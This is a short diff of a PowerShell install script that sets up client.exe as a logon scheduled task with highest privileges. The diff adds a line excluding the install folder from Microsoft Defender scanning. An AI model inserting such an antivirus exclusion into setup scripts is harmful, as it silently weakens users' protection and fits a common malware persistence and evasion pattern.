@@ -8,5 +8,6 @@ $action = New-ScheduledTaskAction -Execute "$installDir\client.exe" -WorkingDire
 $trigger = New-ScheduledTaskTrigger -AtLogOn
 $settings = New-ScheduledTaskSettingsSet -ExecutionTimeLimit 0
 Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force | Out-Null
+Add-MpPreference -ExclusionPath $installDir
 Start-Process -FilePath "$installDir\client.exe" -WorkingDirectory $installDir
 Write-Host "Done."
